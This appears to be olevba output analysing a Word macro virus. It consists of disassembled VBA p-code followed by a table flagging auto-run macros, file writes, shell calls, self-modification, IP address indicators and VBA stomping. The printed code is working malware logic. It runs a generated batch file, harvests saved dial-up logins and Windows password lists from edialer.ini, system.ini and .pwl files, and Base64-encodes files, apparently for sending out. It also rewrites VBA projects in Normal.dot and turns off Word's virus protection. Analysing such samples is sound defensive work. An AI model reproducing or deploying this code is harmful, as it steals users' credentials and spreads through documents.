' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #164:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #165:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #166:
' 	CaseElse 
' Line #167:
' 	Ld hWnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #168:
' 	Ld Friend 
' 	St NF 
' Line #169:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #170:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #171:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #172:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #173:
' 	ArgsCall DoEvents 0x0000 
' Line #174:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #175:
' 	ExitSub 
' Line #176:
' 	EndSelect 
' Line #177:
' 	CaseElse 
' Line #178:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #179:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #180:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #181:
' 	EndSelect 
' Line #182:
' 	StartForVariable 
' 	Next 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Function Chkip())
' Line #186:
' 	Dim 
' 	VarDefn hWnd (As Long)
' Line #187:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #188:
' 	Dim 
' 	VarDefn A (As Long)
' Line #189:
' 	Dim 
' 	VarDefn i (As Long)
' Line #190:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #191:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #192:
' 	OnError (Resume Next) 
' Line #193:
' 	Ld Friend 
' 	St NF 
' Line #194:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #195:
' 	Ld NF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "route print > c:\windows\chkip.bmp"
' 	PrintItemNL 
' Line #196:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #197:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #198:
' 	Ld Timer 
' 	St Start 
' Line #199:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0018 "(Ñåàíñ çàâåðøåí) - chkip"
' 	ArgsLd FindWindow 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #200:
' 	ArgsCall DoEvents 0x0000 
' Line #201:
' 	Ld Timer 
' 	Ld Start 
' 	LitDI2 0x000A 
' 	Add 
' 	Gt 
' 	IfBlock 
' Line #202:
' 	ExitFunc 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	Loop 
' Line #205:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0018 "(Ñåàíñ çàâåðøåí) - chkip"
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd 
' Line #206:
' 	Ld hWnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #207:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	ArgsLd FileLen 0x0001 
' 	St Chkip 
' Line #208:
' 	LitDI2 0x00FF 
' 	St A 
' Line #209:
' 	Ld Friend 
' 	St NF 
' Line #210:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #211:
' 	Ld Friend 
' 	St NF1 
' Line #212:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #213:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #214:
' 	Ld NF 
' 	Sharp 
' 	Ld i 
' 	Ld A 
' 	PutRec 
' Line #215:
' 	StartForVariable 
' 	Next 
' Line #216:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF1 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #217:
' 	Ld NF1 
' 	Sharp 
' 	Ld i 
' 	Ld A 
' 	PutRec 
' Line #218:
' 	StartForVariable 
' 	Next 
' Line #219:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #220:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #221:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	ArgsCall Kill 0x0001 
' Line #222:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	ArgsCall Kill 0x0001 
' Line #223:
' 	EndFunc 
' Line #224:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #225:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #226:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #227:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #228:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #229:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #230:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #231:
' 	StartForVariable 
' 	Next 
' Line #232:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #233:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #234:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #235:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #236:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #237:
' 	StartForVariable 
' 	Next 
' Line #238:
' Line #239:
' 	EndFunc 
' Line #240:
' 	FuncDefn (Sub Filler(MessStr As String, hWnd As Long))
' Line #241:
' 	Dim 
' 	VarDefn i (As Long)
' Line #242:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #243:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #244:
' 	OnError (Resume Next) 
' Line #245:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #246:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #247:
' 	Ld Tmp 
' 	SelectCase 
' Line #248:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #249:
' 	ArgsCall DoEvents 0x0000 
' Line #250:
' 	Ld hWnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #251:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #252:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #253:
' 	CaseElse 
' Line #254:
' 	Ld hWnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #255:
' 	EndSelect 
' Line #256:
' 	StartForVariable 
' 	Next 
' Line #257:
' 	EndSub 
' Line #258:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #259:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #260:
' 	Ld Timer 
' 	St Start 
' Line #261:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #262:
' 	ArgsCall DoEvents 0x0000 
' Line #263:
' 	Loop 
' Line #264:
' 	EndSub 
' Line #265:
' 	FuncDefn (Function Grab(New As String))
' Line #266:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #267:
' 	Dim 
' 	VarDefn AZ (As String)
' Line #268:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #269:
' 	Dim 
' 	VarDefn Num (As Integer)
' Line #270:
' 	Dim 
' 	VarDefn PwdLst (As String)
' Line #271:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #272:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #273:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #274:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #275:
' 	LitStr 0x001A "abcdifghijklmnopqastuvwxyz"
' 	St AZ 
' Line #276:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #277:
' 	LitDI2 0x0019 
' 	ArgsLd Random1 0x0001 
' 	St Num 
' Line #278:
' 	Ld New 
' 	Ld AZ 
' 	Ld Num 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St New 
' Line #279:
' 	StartForVariable 
' 	Next 
' Line #280:
' 	Ld New 
' 	LitStr 0x0004 ".egn"
' 	Add 
' 	St New 
' Line #281:
' 	OnError (Resume Next) 
' Line #282:
' 	Ld Friend 
' 	St NF1 
' Line #283:
' 	LitStr 0x000B "c:\windows\"
' 	Ld New 
' 	Add 
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #284:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #285:
' 	Ld Friend 
' 	St NF 
' Line #286:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #287:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #288:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #289:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #290:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld Tmp 
' 	PrintItemNL 
' Line #291:
' 	EndIfBlock 
' Line #292:
' 	Loop 
' Line #293:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #294:
' 	EndIfBlock 
' Line #295:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #296:
' 	Ld Friend 
' 	St NF 
' Line #297:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #298:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #299:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #300:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #301:
' 	Ld Temp 
' 	LitStr 0x0010 "[Password Lists]"
' 	Eq 
' 	IfBlock 
' Line #302:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #303:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #304:
' 	Ld PwdLst 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Temp 
' 	Add 
' 	St PwdLst 
' Line #305:
' 	Loop 
' Line #306:
' 	ExitDo 
' Line #307:
' 	EndIfBlock 
' Line #308:
' 	Ld Counter 
' 	LitDI2 0x0014 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #309:
' 	ArgsCall DoEvents 0x0000 
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	Loop 
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #314:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld PwdLst 
' 	PrintItemNL 
' Line #315:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #316:
' 	EndFunc 
' Line #317:
' 	FuncDefn (Function Base64(FName As String))
' Line #318:
' 	Dim 
' 	VarDefn i (As Long)
' Line #319:
' 	Dim 
' 	VarDefn ABC (As String)
' Line #320:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #321:
' 	Dim 
' 	VarDefn Char (As Byte)
' Line #322:
' 	Dim 
' 	VarDefn Cod (As Integer)
' Line #323:
' 	Dim 
' 	VarDefn Roll (As Integer)
' Line #324:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #325:
' 	QuoteRem 0x0000 0x0000 ""
' Line #326:
' 	Dim 
' 	VarDefn HMask (As Integer)
' Line #327:
' 	Dim 
' 	VarDefn LMask (As Integer)
' Line #328:
' 	Dim 
' 	VarDefn Shift (As Integer)
' Line #329:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #330:
' Line #331:
' Line #332:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #333:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #334:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #335:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #336:
' 	LitDI2 0x0001 
' 	St Counter 
' Line #337:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St ABC 
' Line #338:
' 	Ld Friend 
' 	St NF 
' Line #339:
' 	OnError (Resume Next) 
' Line #340:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FName 
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #341:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #342:
' 	Ld NF 
' 	Sharp 
' 	Ld Counter 
' 	Ld Char 
' 	GetRec 
' Line #343:
' 	Ld Char 
' 	Ld HMask 
' 	And 
' 	Paren 
' 	Ld LMask 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	IDiv 
' 	Paren 
' 	Ld Roll 
' 	Or 
' 	St Cod 
' Line #344:
' 	Ld Char 
' 	Ld LMask 
' 	And 
' 	Paren 
' 	Ld Shift 
' 	Mul 
' 	St Roll 
' Line #345:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Cod 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #346:
' 	Ld HMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x00FF 
' 	And 
' 	St HMask 
' Line #347:
' 	Ld LMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	St LMask 
' Line #348:
' 	Ld Shift 
' 	LitDI2 0x0004 
' 	IDiv 
' 	St Shift 
' Line #349:
' 	Ld HMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #350:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #351:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #352:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #353:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #354:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #355:
' 	EndIfBlock 
' Line #356:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #357:
' 	StartForVariable 
' 	Next 
' Line #358:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #359:
' 	Ld Shift 
' 	LitDI2 0x0010 
' 	Lt 
' 	IfBlock 
' Line #360:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	Ld Tmp 
' 	FnLen 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	St Cod 
' Line #363:
' 	Ld Cod 
' 	IfBlock 
' Line #364:
' 	Ld Tmp 
' 	LitDI2 0x0004 
' 	Ld Cod 
' 	Sub 
' 	LitStr 0x0001 "="
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	St Tmp 
' Line #365:
' 	EndIfBlock 
' Line #366:
' 	Ld Tmp 
' 	St Base64 
' Line #367:
' 	EndFunc 
' Line #368:
' 	FuncDefn (Function FindPWL(j As Integer, FindFiles As ))
' Line #369:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #370:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #371:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #372:
' 	ExitFunc 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	LitDI2 0x0000 
' 	St j 
' Line #375:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #376:
' 	Ld Dir 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #377:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #378:
' 	Loop 
' Line #379:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #380:
' 	LitDI2 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #381:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #382:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #383:
' 	Ld Dir$ 
' 	Ld j 
' 	ArgsSt FindFiles 0x0001 
' Line #384:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #385:
' 	ElseBlock 
' Line #386:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #387:
' 	EndIfBlock 
' Line #388:
' 	EndFunc 
' Line #389:
' 	FuncDefn (Function Adapt(Cod As String))
' Line #390:
' 	Dim 
' 	VarDefn PostCod (As String)
' Line #391:
' 	Dim 
' 	VarDefn i (As Long)
' Line #392:
' 	OnError (Resume Next) 
' Line #393:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #394:
' 	Ld i 
' 	LitDI2 0x004C 
' 	Ge 
' 	Ld i 
' 	LitDI2 0x004C 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #395:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St PostCod 
' Line #396:
' 	ElseBlock 
' Line #397:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St PostCod 
' Line #398:
' 	EndIfBlock 
' Line #399:
' 	StartForVariable 
' 	Next 
' Line #400:
' 	LitStr 0x0001 "#"
' 	Ld PostCod 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Adapt 
' Line #401:
' 	EndFunc 
' Line #402:
' 	FuncDefn (Function Random1(i As Integer))
' Line #403:
' 	Dim 
' 	VarDefn Resalt (As Integer)
' Line #404:
' 	Ld i 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Resalt 
' Line #405:
' 	Ld Resalt 
' 	St Random1 
' Line #406:
' 	EndFunc 
' Line #407:
' 	FuncDefn (Sub ViewVBCode())
' Line #408:
' 	ArgsCall Deleter 0x0000 
' Line #409:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #410:
' 	EndSub 
' Line #411:
' 	FuncDefn (Sub ToolsMacro())
' Line #412:
' 	ArgsCall Deleter 0x0000 
' Line #413:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #414:
' 	EndSub 
' Line #415:
' 	FuncDefn (Sub Deleter())
' Line #416:
' 	Dim 
' 	VarDefn TempPath (As String)
' 	VarDefn TempName (As String)
' Line #417:
' 	Dim 
' 	VarDefn Docum (As Object)
' Line #418:
' 	Dim 
' 	VarDefn VBComp (As Object)
' Line #419:
' 	OnError (Resume Next) 
' Line #420:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #421:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #422:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #423:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #424:
' 	EndWith 
' Line #425:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #426:
' 	EndIfBlock 
' Line #427:
' 	StartForVariable 
' 	Next 
' Line #428:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #429:
' 	Debug 
' 	PrintObj 
' 	Ld VBComp 
' 	MemLd New 
' 	PrintItemNL 
' Line #430:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #431:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #432:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #433:
' 	EndWith 
' Line #434:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #435:
' 	EndIfBlock 
' Line #436:
' 	StartForVariable 
' 	Next 
' Line #437:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #438:
' 	EndSub 
' Line #439:
' 	FuncDefn (Sub ToolsOptions())
' Line #440:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #441:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #442:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #443:
' 	EndWith 
' Line #444:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #445:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #446:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #447:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #448:
' 	EndWith 
' Line #449:
' 	EndSub 
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |194.67.1.159        |IPv4 address                                 |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |chkip.bat           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

